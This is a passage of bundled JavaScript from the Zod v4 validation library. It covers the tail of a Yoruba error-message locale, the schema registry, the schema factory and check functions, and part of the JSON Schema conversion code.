          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 par\xED p\u1EB9\u0300l\xFA "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 n\xED "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\xE1 \xE0p\u1EB9\u1EB9r\u1EB9 mu ${_issue.pattern}`;
        return `A\u1E63\xEC\u1E63e: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\u1ECD\u0301mb\xE0 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 j\u1EB9\u0301 \xE8y\xE0 p\xEDp\xEDn ti ${issue2.divisor}`;
      case "unrecognized_keys":
        return `B\u1ECDt\xECn\xEC \xE0\xECm\u1ECD\u0300: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `B\u1ECDt\xECn\xEC a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue2.origin}`;
      case "invalid_union":
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
      case "invalid_element":
        return `Iye a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue2.origin}`;
      default:
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
    }
  };
};
function yo_default() {
  return {
    localeError: error47()
  };
}
// node_modules/zod/v4/core/registries.js
var _a;
var $output = Symbol("ZodOutput");
var $input = Symbol("ZodInput");

class $ZodRegistry {
  constructor() {
    this._map = new WeakMap;
    this._idmap = new Map;
  }
  add(schema, ..._meta) {
    const meta = _meta[0];
    this._map.set(schema, meta);
    if (meta && typeof meta === "object" && "id" in meta) {
      this._idmap.set(meta.id, schema);
    }
    return this;
  }
  clear() {
    this._map = new WeakMap;
    this._idmap = new Map;
    return this;
  }
  remove(schema) {
    const meta = this._map.get(schema);
    if (meta && typeof meta === "object" && "id" in meta) {
      this._idmap.delete(meta.id);
    }
    this._map.delete(schema);
    return this;
  }
  get(schema) {
    const p = schema._zod.parent;
    if (p) {
      const pm = { ...this.get(p) ?? {} };
      delete pm.id;
      const f = { ...pm, ...this._map.get(schema) };
      return Object.keys(f).length ? f : undefined;
    }
    return this._map.get(schema);
  }
  has(schema) {
    return this._map.has(schema);
  }
}
function registry() {
  return new $ZodRegistry;
}
(_a = globalThis).__zod_globalRegistry ?? (_a.__zod_globalRegistry = registry());
var globalRegistry = globalThis.__zod_globalRegistry;
// node_modules/zod/v4/core/api.js
function _string(Class2, params) {
  return new Class2({
    type: "string",
    ...normalizeParams(params)
  });
}
function _coercedString(Class2, params) {
  return new Class2({
    type: "string",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _email(Class2, params) {
  return new Class2({
    type: "string",
    format: "email",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _guid(Class2, params) {
  return new Class2({
    type: "string",
    format: "guid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _uuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _uuidv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v4",
    ...normalizeParams(params)
  });
}
function _uuidv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v6",
    ...normalizeParams(params)
  });
}
function _uuidv7(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v7",
    ...normalizeParams(params)
  });
}
function _url(Class2, params) {
  return new Class2({
    type: "string",
    format: "url",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _emoji2(Class2, params) {
  return new Class2({
    type: "string",
    format: "emoji",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _nanoid(Class2, params) {
  return new Class2({
    type: "string",
    format: "nanoid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "cuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cuid2(Class2, params) {
  return new Class2({
    type: "string",
    format: "cuid2",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ulid(Class2, params) {
  return new Class2({
    type: "string",
    format: "ulid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _xid(Class2, params) {
  return new Class2({
    type: "string",
    format: "xid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ksuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "ksuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ipv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "ipv4",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ipv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "ipv6",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _mac(Class2, params) {
  return new Class2({
    type: "string",
    format: "mac",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cidrv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "cidrv4",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cidrv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "cidrv6",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _base64(Class2, params) {
  return new Class2({
    type: "string",
    format: "base64",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _base64url(Class2, params) {
  return new Class2({
    type: "string",
    format: "base64url",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _e164(Class2, params) {
  return new Class2({
    type: "string",
    format: "e164",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _jwt(Class2, params) {
  return new Class2({
    type: "string",
    format: "jwt",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
var TimePrecision = {
  Any: null,
  Minute: -1,
  Second: 0,
  Millisecond: 3,
  Microsecond: 6
};
function _isoDateTime(Class2, params) {
  return new Class2({
    type: "string",
    format: "datetime",
    check: "string_format",
    offset: false,
    local: false,
    precision: null,
    ...normalizeParams(params)
  });
}
function _isoDate(Class2, params) {
  return new Class2({
    type: "string",
    format: "date",
    check: "string_format",
    ...normalizeParams(params)
  });
}
function _isoTime(Class2, params) {
  return new Class2({
    type: "string",
    format: "time",
    check: "string_format",
    precision: null,
    ...normalizeParams(params)
  });
}
function _isoDuration(Class2, params) {
  return new Class2({
    type: "string",
    format: "duration",
    check: "string_format",
    ...normalizeParams(params)
  });
}
function _number(Class2, params) {
  return new Class2({
    type: "number",
    checks: [],
    ...normalizeParams(params)
  });
}
function _coercedNumber(Class2, params) {
  return new Class2({
    type: "number",
    coerce: true,
    checks: [],
    ...normalizeParams(params)
  });
}
function _int(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "safeint",
    ...normalizeParams(params)
  });
}
function _float32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float32",
    ...normalizeParams(params)
  });
}
function _float64(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float64",
    ...normalizeParams(params)
  });
}
function _int32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "int32",
    ...normalizeParams(params)
  });
}
function _uint32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "uint32",
    ...normalizeParams(params)
  });
}
function _boolean(Class2, params) {
  return new Class2({
    type: "boolean",
    ...normalizeParams(params)
  });
}
function _coercedBoolean(Class2, params) {
  return new Class2({
    type: "boolean",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _bigint(Class2, params) {
  return new Class2({
    type: "bigint",
    ...normalizeParams(params)
  });
}
function _coercedBigint(Class2, params) {
  return new Class2({
    type: "bigint",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _int64(Class2, params) {
  return new Class2({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "int64",
    ...normalizeParams(params)
  });
}
function _uint64(Class2, params) {
  return new Class2({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "uint64",
    ...normalizeParams(params)
  });
}
function _symbol(Class2, params) {
  return new Class2({
    type: "symbol",
    ...normalizeParams(params)
  });
}
function _undefined2(Class2, params) {
  return new Class2({
    type: "undefined",
    ...normalizeParams(params)
  });
}
function _null2(Class2, params) {
  return new Class2({
    type: "null",
    ...normalizeParams(params)
  });
}
function _any(Class2) {
  return new Class2({
    type: "any"
  });
}
function _unknown(Class2) {
  return new Class2({
    type: "unknown"
  });
}
function _never(Class2, params) {
  return new Class2({
    type: "never",
    ...normalizeParams(params)
  });
}
function _void(Class2, params) {
  return new Class2({
    type: "void",
    ...normalizeParams(params)
  });
}
function _date(Class2, params) {
  return new Class2({
    type: "date",
    ...normalizeParams(params)
  });
}
function _coercedDate(Class2, params) {
  return new Class2({
    type: "date",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _nan(Class2, params) {
  return new Class2({
    type: "nan",
    ...normalizeParams(params)
  });
}
function _lt(value, params) {
  return new $ZodCheckLessThan({
    check: "less_than",
    ...normalizeParams(params),
    value,
    inclusive: false
  });
}
function _lte(value, params) {
  return new $ZodCheckLessThan({
    check: "less_than",
    ...normalizeParams(params),
    value,
    inclusive: true
  });
}
function _gt(value, params) {
  return new $ZodCheckGreaterThan({
    check: "greater_than",
    ...normalizeParams(params),
    value,
    inclusive: false
  });
}
function _gte(value, params) {
  return new $ZodCheckGreaterThan({
    check: "greater_than",
    ...normalizeParams(params),
    value,
    inclusive: true
  });
}
function _positive(params) {
  return _gt(0, params);
}
function _negative(params) {
  return _lt(0, params);
}
function _nonpositive(params) {
  return _lte(0, params);
}
function _nonnegative(params) {
  return _gte(0, params);
}
function _multipleOf(value, params) {
  return new $ZodCheckMultipleOf({
    check: "multiple_of",
    ...normalizeParams(params),
    value
  });
}
function _maxSize(maximum, params) {
  return new $ZodCheckMaxSize({
    check: "max_size",
    ...normalizeParams(params),
    maximum
  });
}
function _minSize(minimum, params) {
  return new $ZodCheckMinSize({
    check: "min_size",
    ...normalizeParams(params),
    minimum
  });
}
function _size(size, params) {
  return new $ZodCheckSizeEquals({
    check: "size_equals",
    ...normalizeParams(params),
    size
  });
}
function _maxLength(maximum, params) {
  const ch = new $ZodCheckMaxLength({
    check: "max_length",
    ...normalizeParams(params),
    maximum
  });
  return ch;
}
function _minLength(minimum, params) {
  return new $ZodCheckMinLength({
    check: "min_length",
    ...normalizeParams(params),
    minimum
  });
}
function _length(length, params) {
  return new $ZodCheckLengthEquals({
    check: "length_equals",
    ...normalizeParams(params),
    length
  });
}
function _regex(pattern, params) {
  return new $ZodCheckRegex({
    check: "string_format",
    format: "regex",
    ...normalizeParams(params),
    pattern
  });
}
function _lowercase(params) {
  return new $ZodCheckLowerCase({
    check: "string_format",
    format: "lowercase",
    ...normalizeParams(params)
  });
}
function _uppercase(params) {
  return new $ZodCheckUpperCase({
    check: "string_format",
    format: "uppercase",
    ...normalizeParams(params)
  });
}
function _includes(includes, params) {
  return new $ZodCheckIncludes({
    check: "string_format",
    format: "includes",
    ...normalizeParams(params),
    includes
  });
}
function _startsWith(prefix, params) {
  return new $ZodCheckStartsWith({
    check: "string_format",
    format: "starts_with",
    ...normalizeParams(params),
    prefix
  });
}
function _endsWith(suffix, params) {
  return new $ZodCheckEndsWith({
    check: "string_format",
    format: "ends_with",
    ...normalizeParams(params),
    suffix
  });
}
function _property(property, schema, params) {
  return new $ZodCheckProperty({
    check: "property",
    property,
    schema,
    ...normalizeParams(params)
  });
}
function _mime(types, params) {
  return new $ZodCheckMimeType({
    check: "mime_type",
    mime: types,
    ...normalizeParams(params)
  });
}
function _overwrite(tx) {
  return new $ZodCheckOverwrite({
    check: "overwrite",
    tx
  });
}
function _normalize(form) {
  return _overwrite((input) => input.normalize(form));
}
function _trim() {
  return _overwrite((input) => input.trim());
}
function _toLowerCase() {
  return _overwrite((input) => input.toLowerCase());
}
function _toUpperCase() {
  return _overwrite((input) => input.toUpperCase());
}
function _slugify() {
  return _overwrite((input) => slugify(input));
}
function _array(Class2, element, params) {
  return new Class2({
    type: "array",
    element,
    ...normalizeParams(params)
  });
}
function _union(Class2, options, params) {
  return new Class2({
    type: "union",
    options,
    ...normalizeParams(params)
  });
}
function _xor(Class2, options, params) {
  return new Class2({
    type: "union",
    options,
    inclusive: false,
    ...normalizeParams(params)
  });
}
function _discriminatedUnion(Class2, discriminator, options, params) {
  return new Class2({
    type: "union",
    options,
    discriminator,
    ...normalizeParams(params)
  });
}
function _intersection(Class2, left, right) {
  return new Class2({
    type: "intersection",
    left,
    right
  });
}
function _tuple(Class2, items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new Class2({
    type: "tuple",
    items,
    rest,
    ...normalizeParams(params)
  });
}
function _record(Class2, keyType, valueType, params) {
  return new Class2({
    type: "record",
    keyType,
    valueType,
    ...normalizeParams(params)
  });
}
function _map(Class2, keyType, valueType, params) {
  return new Class2({
    type: "map",
    keyType,
    valueType,
    ...normalizeParams(params)
  });
}
function _set(Class2, valueType, params) {
  return new Class2({
    type: "set",
    valueType,
    ...normalizeParams(params)
  });
}
function _enum(Class2, values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new Class2({
    type: "enum",
    entries,
    ...normalizeParams(params)
  });
}
function _nativeEnum(Class2, entries, params) {
  return new Class2({
    type: "enum",
    entries,
    ...normalizeParams(params)
  });
}
function _literal(Class2, value, params) {
  return new Class2({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...normalizeParams(params)
  });
}
function _file(Class2, params) {
  return new Class2({
    type: "file",
    ...normalizeParams(params)
  });
}
function _transform(Class2, fn) {
  return new Class2({
    type: "transform",
    transform: fn
  });
}
function _optional(Class2, innerType) {
  return new Class2({
    type: "optional",
    innerType
  });
}
function _nullable(Class2, innerType) {
  return new Class2({
    type: "nullable",
    innerType
  });
}
function _default(Class2, innerType, defaultValue) {
  return new Class2({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : shallowClone(defaultValue);
    }
  });
}
function _nonoptional(Class2, innerType, params) {
  return new Class2({
    type: "nonoptional",
    innerType,
    ...normalizeParams(params)
  });
}
function _success(Class2, innerType) {
  return new Class2({
    type: "success",
    innerType
  });
}
function _catch(Class2, innerType, catchValue) {
  return new Class2({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
function _pipe(Class2, in_, out) {
  return new Class2({
    type: "pipe",
    in: in_,
    out
  });
}
function _readonly(Class2, innerType) {
  return new Class2({
    type: "readonly",
    innerType
  });
}
function _templateLiteral(Class2, parts, params) {
  return new Class2({
    type: "template_literal",
    parts,
    ...normalizeParams(params)
  });
}
function _lazy(Class2, getter) {
  return new Class2({
    type: "lazy",
    getter
  });
}
function _promise(Class2, innerType) {
  return new Class2({
    type: "promise",
    innerType
  });
}
function _custom(Class2, fn, _params) {
  const norm = normalizeParams(_params);
  norm.abort ?? (norm.abort = true);
  const schema = new Class2({
    type: "custom",
    check: "custom",
    fn,
    ...norm
  });
  return schema;
}
function _refine(Class2, fn, _params) {
  const schema = new Class2({
    type: "custom",
    check: "custom",
    fn,
    ...normalizeParams(_params)
  });
  return schema;
}
function _superRefine(fn) {
  const ch = _check((payload) => {
    payload.addIssue = (issue2) => {
      if (typeof issue2 === "string") {
        payload.issues.push(issue(issue2, payload.value, ch._zod.def));
      } else {
        const _issue = issue2;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = ch);
        _issue.continue ?? (_issue.continue = !ch._zod.def.abort);
        payload.issues.push(issue(_issue));
      }
    };
    return fn(payload.value, payload);
  });
  return ch;
}
function _check(fn, params) {
  const ch = new $ZodCheck({
    check: "custom",
    ...normalizeParams(params)
  });
  ch._zod.check = fn;
  return ch;
}
function describe(description) {
  const ch = new $ZodCheck({ check: "describe" });
  ch._zod.onattach = [
    (inst) => {
      const existing = globalRegistry.get(inst) ?? {};
      globalRegistry.add(inst, { ...existing, description });
    }
  ];
  ch._zod.check = () => {};
  return ch;
}
function meta(metadata) {
  const ch = new $ZodCheck({ check: "meta" });
  ch._zod.onattach = [
    (inst) => {
      const existing = globalRegistry.get(inst) ?? {};
      globalRegistry.add(inst, { ...existing, ...metadata });
    }
  ];
  ch._zod.check = () => {};
  return ch;
}
function _stringbool(Classes, _params) {
  const params = normalizeParams(_params);
  let truthyArray = params.truthy ?? ["true", "1", "yes", "on", "y", "enabled"];
  let falsyArray = params.falsy ?? ["false", "0", "no", "off", "n", "disabled"];
  if (params.case !== "sensitive") {
    truthyArray = truthyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
    falsyArray = falsyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
  }
  const truthySet = new Set(truthyArray);
  const falsySet = new Set(falsyArray);
  const _Codec = Classes.Codec ?? $ZodCodec;
  const _Boolean = Classes.Boolean ?? $ZodBoolean;
  const _String = Classes.String ?? $ZodString;
  const stringSchema = new _String({ type: "string", error: params.error });
  const booleanSchema = new _Boolean({ type: "boolean", error: params.error });
  const codec = new _Codec({
    type: "pipe",
    in: stringSchema,
    out: booleanSchema,
    transform: (input, payload) => {
      let data = input;
      if (params.case !== "sensitive")
        data = data.toLowerCase();
      if (truthySet.has(data)) {
        return true;
      } else if (falsySet.has(data)) {
        return false;
      } else {
        payload.issues.push({
          code: "invalid_value",
          expected: "stringbool",
          values: [...truthySet, ...falsySet],
          input: payload.value,
          inst: codec,
          continue: false
        });
        return {};
      }
    },
    reverseTransform: (input, _payload) => {
      if (input === true) {
        return truthyArray[0] || "true";
      } else {
        return falsyArray[0] || "false";
      }
    },
    error: params.error
  });
  return codec;
}
function _stringFormat(Class2, format, fnOrRegex, _params = {}) {
  const params = normalizeParams(_params);
  const def = {
    ...normalizeParams(_params),
    check: "string_format",
    type: "string",
    format,
    fn: typeof fnOrRegex === "function" ? fnOrRegex : (val) => fnOrRegex.test(val),
    ...params
  };
  if (fnOrRegex instanceof RegExp) {
    def.pattern = fnOrRegex;
  }
  const inst = new Class2(def);
  return inst;
}
// node_modules/zod/v4/core/to-json-schema.js
function initializeContext(params) {
  let target = params?.target ?? "draft-2020-12";
  if (target === "draft-4")
    target = "draft-04";
  if (target === "draft-7")
    target = "draft-07";
  return {
    processors: params.processors ?? {},
    metadataRegistry: params?.metadata ?? globalRegistry,
    target,
    unrepresentable: params?.unrepresentable ?? "throw",
    override: params?.override ?? (() => {}),
    io: params?.io ?? "output",
    counter: 0,
    seen: new Map,
    cycles: params?.cycles ?? "ref",
    reused: params?.reused ?? "inline",
    external: params?.external ?? undefined
  };
}
function process2(schema, ctx, _params = { path: [], schemaPath: [] }) {
  var _a2;
  const def = schema._zod.def;
  const seen = ctx.seen.get(schema);
  if (seen) {
    seen.count++;
    const isCycle = _params.schemaPath.includes(schema);
    if (isCycle) {
      seen.cycle = _params.path;
    }
    return seen.schema;
  }
  const result = { schema: {}, count: 1, cycle: undefined, path: _params.path };
  ctx.seen.set(schema, result);
  const overrideSchema = schema._zod.toJSONSchema?.();
  if (overrideSchema) {
    result.schema = overrideSchema;
  } else {
    const params = {
      ..._params,
      schemaPath: [..._params.schemaPath, schema],
      path: _params.path
    };
    if (schema._zod.processJSONSchema) {
      schema._zod.processJSONSchema(ctx, result.schema, params);
    } else {
      const _json = result.schema;
      const processor = ctx.processors[def.type];
      if (!processor) {
        throw new Error(`[toJSONSchema]: Non-representable type encountered: ${def.type}`);
      }
      processor(schema, ctx, _json, params);
    }
    const parent = schema._zod.parent;
    if (parent) {
      if (!result.ref)
        result.ref = parent;
      process2(parent, ctx, params);
      ctx.seen.get(parent).isParent = true;
    }
  }
  const meta2 = ctx.metadataRegistry.get(schema);
  if (meta2)
    Object.assign(result.schema, meta2);
  if (ctx.io === "input" && isTransforming(schema)) {
    delete result.schema.examples;
    delete result.schema.default;
  }
  if (ctx.io === "input" && result.schema._prefault)
    (_a2 = result.schema).default ?? (_a2.default = result.schema._prefault);
  delete result.schema._prefault;
  const _result = ctx.seen.get(schema);
  return _result.schema;
}
function extractDefs(ctx, schema) {
  const root = ctx.seen.get(schema);
  if (!root)
    throw new Error("Unprocessed schema. This is a bug in Zod.");
  const idToSchema = new Map;
  for (const entry of ctx.seen.entries()) {
    const id = ctx.metadataRegistry.get(entry[0])?.id;
    if (id) {
      const existing = idToSchema.get(id);
      if (existing && existing !== entry[0]) {
        throw new Error(`Duplicate schema id "${id}" detected during JSON Schema conversion. Two different schemas cannot share the same id when converted together.`);
      }
      idToSchema.set(id, entry[0]);
    }
  }
  const makeURI = (entry) => {
    const defsSegment = ctx.target === "draft-2020-12" ? "$defs" : "definitions";
    if (ctx.external) {
      const externalId = ctx.external.registry.get(entry[0])?.id;
      const uriGenerator = ctx.external.uri ?? ((id2) => id2);
      if (externalId) {
        return { ref: uriGenerator(externalId) };
      }
      const id = entry[1].defId ?? entry[1].schema.id ?? `schema${ctx.counter++}`;
      entry[1].defId = id;
      return { defId: id, ref: `${uriGenerator("__shared")}#/${defsSegment}/${id}` };
    }
    if (entry[1] === root) {
      return { ref: "#" };
    }
    const uriPrefix = `#`;
    const defUriPrefix = `${uriPrefix}/${defsSegment}/`;
    const defId = entry[1].schema.id ?? `__schema${ctx.counter++}`;
    return { defId, ref: defUriPrefix + defId };
  };
  const extractToDef = (entry) => {
    if (entry[1].schema.$ref) {
      return;
    }
    const seen = entry[1];
    const { ref, defId } = makeURI(entry);
    seen.def = { ...seen.schema };
    if (defId)
      seen.defId = defId;
    const schema2 = seen.schema;
    for (const key in schema2) {
      delete schema2[key];
    }
    schema2.$ref = ref;
  };
  if (ctx.cycles === "throw") {
    for (const entry of ctx.seen.entries()) {
      const seen = entry[1];
      if (seen.cycle) {
        throw new Error("Cycle detected: " + `#/${seen.cycle?.join("/")}/<root>` + '\n\nSet the `cycles` parameter to `"ref"` to resolve cyclical schemas with defs.');
      }
    }
  }
  for (const entry of ctx.seen.entries()) {
    const seen = entry[1];
    if (schema === entry[0]) {
      extractToDef(entry);
      continue;
    }
    if (ctx.external) {
      const ext = ctx.external.registry.get(entry[0])?.id;
      if (schema !== entry[0] && ext) {
        extractToDef(entry);
        continue;
      }
    }
    const id = ctx.metadataRegistry.get(entry[0])?.id;
    if (id) {
      extractToDef(entry);
      continue;
    }
    if (seen.cycle) {
      extractToDef(entry);
      continue;
    }
    if (seen.count > 1) {
      if (ctx.reused === "ref") {
        extractToDef(entry);
        continue;
      }
    }
  }
}
function finalize(ctx, schema) {
  const root = ctx.seen.get(schema);
  if (!root)
    throw new Error("Unprocessed schema. This is a bug in Zod.");
  const flattenRef = (zodSchema) => {
    const seen = ctx.seen.get(zodSchema);
    if (seen.ref === null)
      return;
    const schema2 = seen.def ?? seen.schema;
    const _cached = { ...schema2 };
    const ref = seen.ref;
    seen.ref = null;
    if (ref) {
      flattenRef(ref);
      const refSeen = ctx.seen.get(ref);
      const refSchema = refSeen.schema;
      if (refSchema.$ref && (ctx.target === "draft-07" || ctx.target === "draft-04" || ctx.target === "openapi-3.0")) {
        schema2.allOf = schema2.allOf ?? [];
        schema2.allOf.push(refSchema);
      } else {
        Object.assign(schema2, refSchema);
      }
      Object.assign(schema2, _cached);
      const isParentRef = zodSchema._zod.parent === ref;
      if (isParentRef) {
        for (const key in schema2) {
          if (key === "$ref" || key === "allOf")
            continue;
          if (!(key in _cached)) {
            delete schema2[key];
          }
        }
      }
      if (refSchema.$ref && refSeen.def) {
        for (const key in schema2) {
          if (key === "$ref" || key === "allOf")
            continue;
          if (key in refSeen.def && JSON.stringify(schema2[key]) === JSON.stringify(refSeen.def[key])) {
            delete schema2[key];
          }
        }
      }
    }
    const parent = zodSchema._zod.parent;
    if (parent && parent !== ref) {
      flattenRef(parent);
      const parentSeen = ctx.seen.get(parent);
      if (parentSeen?.schema.$ref) {
        schema2.$ref = parentSeen.schema.$ref;
        if (parentSeen.def) {
          for (const key in schema2) {
            if (key === "$ref" || key === "allOf")
              continue;
            if (key in parentSeen.def && JSON.stringify(schema2[key]) === JSON.stringify(parentSeen.def[key])) {
              delete schema2[key];
            }
          }
        }
      }
    }
    ctx.override({
      zodSchema,
      jsonSchema: schema2,
      path: seen.path ?? []
    });
  };
  for (const entry of [...ctx.seen.entries()].reverse()) {
    flattenRef(entry[0]);
  }
  const result = {};
  if (ctx.target === "draft-2020-12") {
    result.$schema = "https://json-schema.org/draft/2020-12/schema";
  } else if (ctx.target === "draft-07") {
    result.$schema = "http://json-schema.org/draft-07/schema#";
  } else if (ctx.target === "draft-04") {
    result.$schema = "http://json-schema.org/draft-04/schema#";
  } else if (ctx.target === "openapi-3.0") {} else {}
  if (ctx.external?.uri) {
    const id = ctx.external.registry.get(schema)?.id;
    if (!id)
      throw new Error("Schema is missing an `id` property");
    result.$id = ctx.external.uri(id);
  }
  Object.assign(result, root.def ?? root.schema);
  const defs = ctx.external?.defs ?? {};
  for (const entry of ctx.seen.entries()) {
    const seen = entry[1];
    if (seen.def && seen.defId) {
      defs[seen.defId] = seen.def;
    }
  }
  if (ctx.external) {} else {
    if (Object.keys(defs).length > 0) {
      if (ctx.target === "draft-2020-12") {
        result.$defs = defs;
      } else {
        result.definitions = defs;
      }
    }
  }
  try {
    const finalized = JSON.parse(JSON.stringify(result));
    Object.defineProperty(finalized, "~standard", {
      value: {
        ...schema["~standard"],
        jsonSchema: {
          input: createStandardJSONSchemaMethod(schema, "input", ctx.processors),
          output: createStandardJSONSchemaMethod(schema, "output", ctx.processors)
        }
      },
      enumerable: false,
      writable: false
    });
    return finalized;
  } catch (_err) {
    throw new Error("Error converting schema to JSON.");
  }
}
function isTransforming(_schema, _ctx) {
  const ctx = _ctx ?? { seen: new Set };
  if (ctx.seen.has(_schema))
    return false;
  ctx.seen.add(_schema);
  const def = _schema._zod.def;
  if (def.type === "transform")
    return true;
  if (def.type === "array")
    return isTransforming(def.element, ctx);
  if (def.type === "set")
    return isTransforming(def.valueType, ctx);
  if (def.type === "lazy")
    return isTransforming(def.getter(), ctx);
  if (def.type === "promise" || def.type === "optional" || def.type === "nonoptional" || def.type === "nullable" || def.type === "readonly" || def.type === "default" || def.type === "prefault") {
    return isTransforming(def.innerType, ctx);
  }
  if (def.type === "intersection") {
    return isTransforming(def.left, ctx) || isTransforming(def.right, ctx);
  }
  if (def.type === "record" || def.type === "map") {
    return isTransforming(def.keyType, ctx) || isTransforming(def.valueType, ctx);
  }
  if (def.type === "pipe") {
    return isTransforming(def.in, ctx) || isTransforming(def.out, ctx);
  }
  if (def.type === "object") {
    for (const key in def.shape) {
      if (isTransforming(def.shape[key], ctx))
        return true;
    }
    return false;
  }
  if (def.type === "union") {
    for (const option of def.options) {
      if (isTransforming(option, ctx))
        return true;
    }
    return false;
  }
  if (def.type === "tuple") {
    for (const item of def.items) {
      if (isTransforming(item, ctx))
        return true;
    }
    if (def.rest && isTransforming(def.rest, ctx))
      return true;
    return false;
  }
  return false;
}
var createToJSONSchemaMethod = (schema, processors = {}) => (params) => {
  const ctx = initializeContext({ ...params, processors });
  process2(schema, ctx);
  extractDefs(ctx, schema);
  return finalize(ctx, schema);
};
var createStandardJSONSchemaMethod = (schema, io, processors = {}) => (params) => {
  const { libraryOptions, target } = params ?? {};
  const ctx = initializeContext({ ...libraryOptions ?? {}, target, io, processors });
  process2(schema, ctx);
  extractDefs(ctx, schema);
  return finalize(ctx, schema);
};
// node_modules/zod/v4/core/json-schema-processors.js
var formatMap = {
  guid: "uuid",
  url: "uri",
  datetime: "date-time",
  json_string: "json-string",
  regex: ""
};
var stringProcessor = (schema, ctx, _json, _params) => {
  const json = _json;
  json.type = "string";
  const { minimum, maximum, format, patterns, contentEncoding } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minLength = minimum;
  if (typeof maximum === "number")
    json.maxLength = maximum;
  if (format) {
    json.format = formatMap[format] ?? format;
    if (json.format === "")
      delete json.format;
    if (format === "time") {
      delete json.format;
    }
  }
  if (contentEncoding)
    json.contentEncoding = contentEncoding;
  if (patterns && patterns.size > 0) {
    const regexes = [...patterns];
    if (regexes.length === 1)
      json.pattern = regexes[0].source;
    else if (regexes.length > 1) {
      json.allOf = [
        ...regexes.map((regex) => ({
          ...ctx.target === "draft-07" || ctx.target === "draft-04" || ctx.target === "openapi-3.0" ? { type: "string" } : {},
          pattern: regex.source
        }))
      ];
    }
  }
};
var numberProcessor = (schema, ctx, _json, _params) => {
  const json = _json;
  const { minimum, maximum, format, multipleOf, exclusiveMaximum, exclusiveMinimum } = schema._zod.bag;
  if (typeof format === "string" && format.includes("int"))
    json.type = "integer";
  else
    json.type = "number";
  if (typeof exclusiveMinimum === "number") {
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.minimum = exclusiveMinimum;
      json.exclusiveMinimum = true;
    } else {
      json.exclusiveMinimum = exclusiveMinimum;
    }
  }
  if (typeof minimum === "number") {
